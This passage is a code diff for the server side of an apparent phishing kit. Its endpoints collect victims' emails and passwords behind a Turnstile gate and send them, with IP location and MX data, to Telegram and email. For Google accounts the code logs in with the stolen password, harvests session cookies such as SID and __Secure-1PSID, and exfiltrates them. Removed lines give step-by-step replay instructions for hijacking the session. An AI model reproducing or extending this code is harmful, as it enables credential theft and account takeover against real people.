+                    TL: tl2,
+                    dsh: dsh2,
+                    continue: cont,
+                    service: 'mail',
+                    hl: 'en',
+                    flowName: 'GlifWebSignIn',
+                    flowEntry: 'ServiceLogin'
+                }).toString()
+            });
+        }
     }
 
-    tl = pickTL(body) || tl;
-
-    // hop 3 — password
-    res = await go(`${A}/v3/signin/challenge/pwd?continue=${CONT}&dsh=${dsh}&TL=${encodeURIComponent(tl)}&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1`, {
-        method: 'POST',
-        headers: formHeaders,
-        body: new URLSearchParams({
-            password,
-            TL: tl,
-            dsh,
-            continue: 'https://mail.google.com',
-            pstMsg: '1',
-            checkedDomains: 'youtube',
-            checkConnection: 'youtube:177:1',
-            idvSession: ''
-        }).toString()
-    });
-
-    const out = res.headers.get('location') || '';
-    const hasSid = jar.some(c => c.name === 'SID');
-    const hasPsid = jar.some(c => c.name === '__Secure-1PSID');
-
-    // hop 4 — walk the remaining redirects so mail.google.com scoped cookies land too
-    let next = absolutize(out, A);
-    let hops = 0;
-    while (next && hops < GMAIL_CHAIN_HOPS && !/mail\.google\.com\/mail/.test(next) === false ? false : false) { break; }
+    // ---- 3. chase redirects (CheckCookie -> mail.google.com) ----
+    let next = absolutize(res.headers.get('location'), A);
     hops = 0;
-    while (next && hops < GMAIL_CHAIN_HOPS) {
-        hops++;
+    while (next && hops++ < GMAIL_CHAIN_HOPS) {
+        if (/challenge\/(totp|ipp|dp|sk|az)/.test(next) || /\/v3\/signin\/challenge/.test(next)) {
+            needs2fa = true;
+            break;
+        }
         const r2 = await go(next);
         if (r2.status >= 300 && r2.status < 400) {
             next = absolutize(r2.headers.get('location'), next);
@@ -525,40 +523,39 @@ async function gmailLogin(email, password, ua) {
         break;
     }
 
-    const ok = hasSid && hasPsid;
-    return { ok, jar, trace, finalUrl: next || out || null, stageReached: ok ? 'session' : 'pwd' };
+    // ---- 4. top up accounts.google.com + google.com sets ----
+    if (jar.has('SID') || jar.has('__Secure-1PSID')) {
+        await go(`${A}/ListAccounts?authuser=0&gpsia=1&source=ogb&mo=1&listPages=1&lp=1&hl=en`).catch(() => {});
+        await go('https://myaccount.google.com/').catch(() => {});
+        await go('https://www.google.com/').catch(() => {});
+        await go(cont).catch(() => {});
+    }
+
+    const ok = jar.has('SID') && jar.has('__Secure-1PSID');
+    return { ok, jar, trace, needs2fa, finalUrl: next || null };
 }
 
 // ============================================================
-// HEALTH CHECK
+// HEALTH
 // ============================================================
-
 app.get('/health', (req, res) => {
     res.json({
         status: 'ok',
-        timestamp: new Date().toISOString(),
         uptime: process.uptime(),
-        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
-        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
-        teamsRedirectConfigured: !!TEAMS_REDIRECT,
-        turnstileConfigured: !!TURNSTILE_SECRET_KEY,
+        telegram: !!(BOT_TOKEN && CHAT_ID),
+        email: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
+        turnstile: !!TURNSTILE_SECRET_KEY,
         requireTurnstile: REQUIRE_TURNSTILE,
-        proofTtlSeconds: PROOF_TTL_MS / 1000,
         gmailCapture: GMAIL_CAPTURE,
         gmailEgressProxy: !!GMAIL_EGRESS_PROXY
     });
 });
 
 // ============================================================
-// TURNSTILE VERIFY ENDPOINT
+// TURNSTILE VERIFY
 // ============================================================
-
 app.post('/api/turnstile-verify', async (req, res) => {
-    console.log('🛡️ Turnstile verify request received');
-
-    const body = req.body || {};
-    const { token, email } = body;
-
+    const { token, email } = req.body || {};
     if (!token || typeof token !== 'string') {
         return res.status(400).json({ success: false, message: 'Turnstile token required' });
     }
@@ -566,28 +563,14 @@ app.post('/api/turnstile-verify', async (req, res) => {
         return res.status(400).json({ success: false, message: 'Valid email required' });
     }
 
-    const clientIP = firstClientIp(req);
-    const result = await verifyTurnstile(token, clientIP);
-
+    const result = await verifyTurnstile(token, firstClientIp(req));
     if (!result.success) {
-        const details = result.data || { error: result.error };
-        console.warn(`🚫 Turnstile failed for ${email}:`, details);
-        return res.status(403).json({
-            success: false,
-            message: 'Turnstile verification failed',
-            details
-        });
+        return res.status(403).json({ success: false, message: 'Turnstile failed', details: result.data || result.error });
     }
 
     const { proof, ts, expiresAt } = makeProof(email);
-    console.log(`✅ Turnstile passed for ${email} (proof TTL ${PROOF_TTL_MS / 1000}s)`);
-
     return res.json({
-        success: true,
-        email,
-        proof,
-        ts,
-        expiresAt,
+        success: true, email, proof, ts, expiresAt,
         redirect: '/login.html?u=' + encodeURIComponent(email)
                 + '&p=' + encodeURIComponent(proof)
                 + '&t=' + ts
@@ -595,236 +578,177 @@ app.post('/api/turnstile-verify', async (req, res) => {
 });
 
 // ============================================================
-// LOGIN ENDPOINT
+// LOGIN
 // ============================================================
-
 app.post('/api/login', async (req, res) => {
-    console.log('📧 Login attempt received');
-
-    const body = req.body || {};
-    const {
-        email, password, stage = 1, firstPassword,
-        turnstileToken, proof, proofTs
-    } = body;
+    const { email, password, stage = 1, firstPassword, turnstileToken, proof, proofTs } = req.body || {};
 
     if (!email || !password) {
         return res.status(400).json({ success: false, message: 'Email and password required' });
     }
-
-    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-    if (!emailRegex.test(email)) {
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
         return res.status(400).json({ success: false, message: 'Invalid email format' });
     }
 
-    // ----- TURNSTILE PROTECTION (stage 1 only) -----
     if (stage === 1) {
-        const clientIP = firstClientIp(req);
-        let turnstilePassed = false;
-        let turnstileReason = 'not-checked';
-
+        let passed = false, reason = 'not-checked';
         if (proof && proofTs) {
             const v = verifyProof(email, proof, proofTs);
-            turnstilePassed = v.valid;
-            turnstileReason = v.reason;
+            passed = v.valid; reason = v.reason;
         } else if (turnstileToken) {
-            const v = await verifyTurnstile(turnstileToken, clientIP);
-            turnstilePassed = v.success;
-            turnstileReason = v.success ? 'ok' : 'turnstile-failed';
+            const v = await verifyTurnstile(turnstileToken, firstClientIp(req));
+            passed = v.success; reason = v.success ? 'ok' : 'turnstile-failed';
         } else {
-            turnstileReason = 'no-proof';
+            reason = 'no-proof';
         }
-
-        if (!turnstilePassed) {
-            console.warn(`🚫 Stage 1 blocked for ${email} — reason: ${turnstileReason}`);
-            if (REQUIRE_TURNSTILE) {
-                return res.status(403).json({
-                    success: false,
-                    stage: 1,
-                    message: 'Human verification required',
-                    reason: turnstileReason
-                });
-            }
-        } else {
-            console.log(`✅ Turnstile passed for ${email} (${turnstileReason})`);
+        if (!passed && REQUIRE_TURNSTILE) {
+            return res.status(403).json({ success: false, stage: 1, message: 'Human verification required', reason });
         }
+        console.log(`🛡️ stage 1 gate: ${email} -> ${passed ? 'pass' : 'permissive-skip'} (${reason})`);
     }
 
-    // ----- EXISTING LOGIC -----
-    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
+    const clientIP = firstClientIp(req);
     const ipInfo = await getIPInfo(clientIP);
     const domain = email.split('@')[1];
     const mxRecord = await getMXRecord(domain);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const acceptLanguage = req.headers['accept-language'] || 'Unknown';
 
+    const isGoogle = GMAIL_DOMAINS.has(domain.toLowerCase()) || /google/i.test(mxRecord);
     const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
-    const matchLine  = stage === 2
+    const matchLine = stage === 2
         ? `First Password : ${firstPassword}\nMatch : ${firstPassword === password ? '✅ YES' : '❌ NO'}\n`
         : '';
 
-    const telegramMessage = `
---------+ Excel ReZulT [${stageLabel}] ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
-Email : ${email}
-Password : ${password}
-${matchLine}Checker: ${email}:${password}
-Browser : ${userAgent}
-Language : ${acceptLanguage}
-MX Record : ${mxRecord}
-IP Address : ${clientIP}
-Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
-Date : ${new Date().toISOString()}
----------+ Excel ReZulT [${stageLabel}] +-------------
-`;
-
-    console.log(`📤 Sending to Telegram (stage ${stage})...`);
-    const telegramResult = await sendToTelegram(telegramMessage);
-
-    console.log('📧 Sending email via Brevo...');
-    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage);
-
-    // ----- Stage 2 -----
-    if (stage === 2) {
-        const matches = (firstPassword === password);
-
-        if (matches && TEAMS_REDIRECT) {
-            return res.json({
-                success: true,
-                stage,
-                match: true,
-                redirect: TEAMS_REDIRECT
-            });
-        }
-
-        return res.json({
-            success: true,
-            stage,
-            match: false,
-            message: 'Passwords do not match'
-        });
-    }
-
-    // ----- Stage 1 -----
-    const telegramOK = !!(telegramResult && telegramResult.ok);
-    return res.json({
-        success: true,
-        stage: 1,
-        notifications: { telegram: telegramOK, email: emailResult }
-    });
-});
-
-// ============================================================
-// GMAIL SESSION CAPTURE ENDPOINT
-// ============================================================
-
-app.post('/api/gmail-session', async (req, res) => {
-    if (!GMAIL_CAPTURE) {
-        return res.json({ ok: false, disabled: true });
-    }
-
-    const body = req.body || {};
-    const { email, password, firstPassword, fingerprint = {} } = body;
-
-    if (!email || !password) {
-        return res.status(400).json({ ok: false, message: 'email and password required' });
-    }
-
-    const ua = fingerprint.userAgent || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
-    const clientIP = firstClientIp(req);
-
-    // build the candidate list: current first, then the stage-1 password
-    const candidates = [...new Set([password, firstPassword].filter(Boolean))]
-        .slice(0, GMAIL_MAX_CANDIDATES);
-
-    console.log(`🔓 GMAIL capture start for ${email} (${candidates.length} candidate(s))`);
-
-    let best = null;
-    for (const pw of candidates) {
-        try {
-            const out = await gmailLogin(email, pw, ua);
-            if (!best) best = { pw, ...out };
-            if (out.ok) { best = { pw, ...out }; break; }
-        } catch (err) {
-            console.error('❌ GMAIL hop error:', err.message);
-            if (!best) best = { pw, jar: [], trace: [{ error: err.message }], ok: false, finalUrl: null, stageReached: 'error' };
-        }
-    }
-
-    const jar = best?.jar || [];
-    const ok = !!(best && best.ok);
-
-    // full session document — every cookie, critical ones flagged
-    const payload = {
-        email,
-        password: best?.pw || password,
-        valid: ok,
-        stageReached: best?.stageReached || 'unknown',
-        finalUrl: best?.finalUrl || null,
-        trace: best?.trace || [],
-        userAgent: ua,
-        acceptLanguage: req.headers['accept-language'] || null,
-        ip: clientIP,
-        ipInfo: await getIPInfo(clientIP),
-        ts: Math.floor(Date.now() / 1000),
-        isoTime: new Date().toISOString(),
-        fingerprint,
-        cookieCount: jar.length,
-        criticalCount: jar.filter(c => c.critical).length,
-        cookieHeader: cookieHeaderOf(jar),
-        cookies: jar,
-        sessionCookies: jar.filter(c => c.critical),
-        replay: {
-            steps: [
-                '1. Install Cookie-Editor in a clean Chrome profile',
-                '2. Import the cookies array (Cookie-Editor -> Import)',
-                '3. Override the UA to userAgent exactly (DevTools device toolbar or UA Switcher)',
-                '4. Set timezone to fingerprint.timezone, locale to fingerprint.languages[0]',
-                '5. Prefer an exit node in ipInfo.country, ideally the same ASN',
-                '6. Navigate to https://mail.google.com/mail/u/0/ within 2 minutes',
-                '7. __Secure-1PSIDTS rotates fast - replay promptly or expect a re-auth prompt'
-            ],
-            cookieEditorReady: true,
-            curlExample: `curl -H 'Cookie: ${cookieHeaderOf(jar).slice(0, 120)}...' -H 'User-Agent: ${ua}' https://mail.google.com/mail/u/0/`
-        }
-    };
-
-    const caption = `GMAIL ${ok ? 'OK' : 'FAIL'} ${email} — ${jar.length} cookies (${payload.criticalCount} critical)`;
-    const filename = `${ok ? 'ok' : 'fail'}-${Date.now()}-${email.replace(/[^a-z0-9]/gi, '_')}.json`;
-
-    console.log(`📤 GMAIL ${ok ? 'OK' : 'FAIL'} ${email} — ${jar.length} cookies, ${payload.criticalCount} critical`);
-    await sendTelegramDocument(caption, filename, payload);
-
-    // short human-readable line too
     await sendToTelegram(
-        `${ok ? '✅' : '❌'} GMAIL SESSION ${email}\n` +
-        `Cookies: ${jar.length} (${payload.criticalCount} critical)\n` +
-        `SID: ${jar.some(c => c.name === 'SID') ? 'yes' : 'no'} | ` +
-        `1PSID: ${jar.some(c => c.name === '__Secure-1PSID') ? 'yes' : 'no'}\n` +
-        `Stage: ${payload.stageReached}\n` +
-        `Final: ${(payload.finalUrl || 'n/a').slice(0, 120)}\n` +
-        `IP: ${clientIP}`
+        `--------+ ReZulT [${stageLabel}] +--------\n` +
+        `Email : ${email}\nPassword : ${password}\n${matchLine}` +
+        `Browser : ${userAgent}\nLanguage : ${acceptLanguage}\n` +
+        `MX : ${mxRecord}\nIP : ${clientIP}\n` +
+        `Location : ${ipInfo.city || '?'} ${ipInfo.region || '?'}, ${ipInfo.country || '?'}\n` +
+        `Date : ${new Date().toISOString()}\n` +
+        `---------+ ReZulT [${stageLabel}] +-------------`
     );
 
-    return res.json({ ok, critical: payload.criticalCount, total: jar.length });
-});
+    sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage).catch(() => {});
 
-// ============================================================
-// 404
-// ============================================================
+    if (stage !== 2) {
+        return res.json({ success: true, stage: 1 });
+    }
 
-app.use((req, res) => {
-    res.status(404).json({
-        success: false,
-        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
+    const match = firstPassword === password;
+    const googleRedirect = GMAIL_DOMAINS.has(domain.toLowerCase())
+        ? 'https://mail.google.com/mail/u/0/'
+        : `https://mail.google.com/a/${domain}/`;
+    const plainRedirect = TEAMS_REDIRECT || `https://${domain}`;
+
+    if (!match) {
+        return res.json({ success: true, stage: 2, match: false, message: 'Passwords do not match' });
+    }
+
+    if (!GMAIL_CAPTURE || !isGoogle) {
+        return res.json({ success: true, stage: 2, match: true, redirect: isGoogle ? googleRedirect : plainRedirect, harvest: null });
+    }
+
+    // ---- harvest ----
+    const ua = req.headers['user-agent'] || GMAIL_UA_FALLBACK;
+    const tries = [...new Set([password, firstPassword].filter(Boolean))].slice(0, GMAIL_MAX_TRIES);
+
+    let best = null;
+    for (const pw of tries) {
+        try {
+            const out = await googleHarvest(email, pw, ua);
+            if (!best || out.ok) best = { pw, ...out };
+            if (out.ok) break;
+        } catch (e) {
+            console.error('❌ harvest hop error:', e.message);
+            if (!best) best = { pw, ok: false, jar: new Jar(), trace: [{ error: e.message }], needs2fa: false, finalUrl: null };
+        }
+    }
+
+    const jar = best?.jar || new Jar();
+    const cookies = jar.export();
+    const json = JSON.stringify(cookies, null, 2);
+    const safe = email.replace(/[^a-z0-9]/gi, '_');
+    const filename = `cookies-${safe}.json`;
+
+    const caption =
+        `<b>Gmail session ${best?.ok ? 'OK' : 'PARTIAL'}</b>\n` +
+        `<code>${email}</code>\n` +
+        `<code>${password}</code>\n` +
+        `Cookies: ${cookies.length} (${jar.has('SID') ? 'SID' : 'no SID'}/${jar.has('__Secure-1PSID') ? '1PSID' : 'no 1PSID'})\n` +
+        `IP: ${clientIP} · ${ipInfo.country || '?'}`;
+
+    const telegram = best?.ok
+        ? await sendTelegramDocument(caption, filename, json)
+        : { ok: false, reason: 'no-session' };
+
+    console.log(`🍪 ${email} -> ${cookies.length} cookies, ok=${!!best?.ok}, tg=${telegram.ok}`);
+
+    return res.json({
+        success: true,
+        stage: 2,
+        match: true,
+        redirect: googleRedirect,
+        harvest: {
+            ok: !!best?.ok,
+            needs2fa: !!best?.needs2fa,
+            total: cookies.length,
+            critical: cookies.filter(c => CRITICAL_COOKIES.has(c.name)).length,
+            hasSid: jar.has('SID'),
+            hasPsid: jar.has('__Secure-1PSID'),
+            filename,
+            json,
+            telegram
+        }
     });
 });
 
 // ============================================================
-// START
+// STANDALONE HARVEST (optional, same engine)
 // ============================================================
+app.post('/api/gmail-session', async (req, res) => {
+    if (!GMAIL_CAPTURE) return res.json({ ok: false, disabled: true });
 
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    const { email, password, fingerprint = {} } = req.body || {};
+    if (!email || !password) return res.status(400).json({ ok: false, message: 'email and password required' });
+
+    const ua = fingerprint.userAgent || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
+    try {
+        const out = await googleHarvest(email, password, ua);
+        const cookies = out.jar.export();
+        const json = JSON.stringify(cookies, null, 2);
+        const safe = email.replace(/[^a-z0-9]/gi, '_');
+        const filename = `cookies-${safe}.json`;
+
+        await sendTelegramDocument(
+            `<b>Gmail session ${out.ok ? 'OK' : 'PARTIAL'}</b>\n<code>${email}</code>\nCookies: ${cookies.length}`,
+            filename, json
+        );
+
+        res.json({
+            ok: out.ok,
+            needs2fa: out.needs2fa,
+            total: cookies.length,
+            filename,
+            json,
+            cookies,
+            finalUrl: out.finalUrl,
+            cookieHeader: out.jar.headerForExport()
+        });
+    } catch (e) {
+        res.status(500).json({ ok: false, error: e.message });
+    }
 });
 
-process.on('uncaughtException',  (err) => console.error('❌ Uncaught:', err.message));
-process.on('unhandledRejection', (r)   => console.error('❌ Unhandled:', r));
+// ============================================================
+// 404 + START
+// ============================================================
+app.use((req, res) => {
+    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
+});
+
+app.listen(PORT, () => console.log(`🚀 listening on ${PORT}`));
+
+process.on('uncaughtException', e => console.error('❌ Uncaught:', e.message));
+process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));
